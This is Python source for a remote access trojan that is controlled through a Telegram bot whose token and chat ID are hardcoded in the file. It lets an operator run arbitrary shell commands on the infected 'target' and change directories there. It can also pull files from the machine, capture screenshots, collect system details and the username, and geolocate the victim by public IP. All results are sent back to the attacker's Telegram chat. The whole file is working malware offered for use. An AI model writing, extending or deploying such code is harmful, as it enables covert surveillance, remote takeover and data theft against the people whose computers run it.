import os
import platform
import telebot
import requests
import subprocess
import time
import pygrabshot

TOKEN = '6561277410:AAEVua2fekAeA350qbnz4ySyBYIhE0Fz76Y'
CHAT_ID = '5698157759'
processed_message_ids = []

bot = telebot.TeleBot(TOKEN)

def get_updates(offset=None):
    url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
    params = {'offset': offset, 'timeout': 60}
    response = requests.get(url, params=params)
    if response.status_code == 200:
        data = response.json()
        return data.get('result', [])
    else:
        print(f"Failed to get updates. Status code: {response.status_code}")
        return []

def delete_message(message_id):
    url = f"https://api.telegram.org/bot{TOKEN}/deleteMessage"
    params = {'chat_id': CHAT_ID, 'message_id': message_id}
    response = requests.get(url, params=params)
    if response.status_code != 200:
        print(f"Failed to delete message.")

@bot.message_handler(commands=['start', 'help'])
def send_help(message):
    help_text = '''
    HELP MENU: Coded By Vilgax
    CMD Commands        | Execute cmd commands directly in bot
    cd ..               | Change the current directory
    cd foldername       | Change to the specified folder
    download filename   | Download File From Target
    screenshot          | Capture Screenshot
    info                | Get System Info
    location            | Get Target Location
    '''
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['location'])
def get_location(message):
    response = requests.get('https://ifconfig.me/ip')
    public_ip = response.text.strip()
    try:
        url = f'http://ip-api.com/json/{public_ip}'
        response = requests.get(url)
        data = response.json()
        country = data.get('country')
        region = data.get('region')
        city = data.get('city')
        lat = data.get('lat')
        lon = data.get('lon')
        timezone = data.get('timezone')
        isp = data.get('isp')
        final = f"Country: {country},\nRegion: {region},\nCity: {city},\nLatitude: {lat},\nLongitude: {lon},\nTimezone: {timezone},\nISP: {isp}"
        bot.reply_to(message, final)
    except Exception as e:
        bot.reply_to(message, ' error occurred')

@bot.message_handler(commands=['info'])
def get_system_info(message):
    system_info = {
        'Platform': platform.platform(),
        'System': platform.system(),
        'Node Name': platform.node(),
        'Release': platform.release(),
        'Version': platform.version(),
        'Machine': platform.machine(),
        'Processor': platform.processor(),
        'CPU Cores': os.cpu_count(),
        'Username': os.getlogin(),
    }
    info_string = '\n'.join(f"{key}: {value}" for key, value in system_info.items())
    bot.reply_to(message, info_string)

@bot.message_handler(commands=['screenshot'])
def capture_screenshot(message):
    file_path = "screenshot.png"
    try:
        with pygrabshot.pygrabshot() as sct:
            screenshot = sct.shot(output=file_path)
        bot.reply_to(message, "Screenshot taken.")
        with open(file_path, 'rb') as file:
            bot.send_document(CHAT_ID, file)
        os.remove(file_path)
    except Exception as e:
        bot.reply_to(message, f"Error taking screenshot: {e}")

@bot.message_handler(commands=['download'])
def download_file(message):
    if len(message.text.split()) == 2:
        filename = message.text.split()[1]
        if os.path.isfile(filename):
            with open(filename, 'rb') as file:
                bot.send_document(CHAT_ID, file)
            bot.reply_to(message, f"File '{filename}' sent to Telegram.")
        else:
            bot.reply_to(message, f"File '{filename}' not found.")
    else:
        bot.reply_to(message, "Usage: /download filename")

@bot.message_handler(commands=['cd'])
def change_directory(message):
    if len(message.text.split()) == 2:
        foldername = message.text.split()[1]
        try:
            os.chdir(foldername)
            bot.reply_to(message, "Current directory changed to: " + os.getcwd())
        except FileNotFoundError:
            bot.reply_to(message, f"Directory not found: {foldername}")
        except Exception as e:
            bot.reply_to(message, f"Failed to change directory. Error: {str(e)}")
    else:
        bot.reply_to(message, "Usage: /cd foldername")

@bot.message_handler(func=lambda message: True)
def execute_command(message):
    if message.text.startswith('/'):
        return
    try:
        result = subprocess.check_output(message.text, shell=True, stderr=subprocess.STDOUT)
        bot.reply_to(message, result.decode('utf-8').strip())
    except subprocess.CalledProcessError as e:
        bot.reply_to(message, f"Command execution failed. Error: {e.output.decode('utf-8').strip()}")



bot.polling()
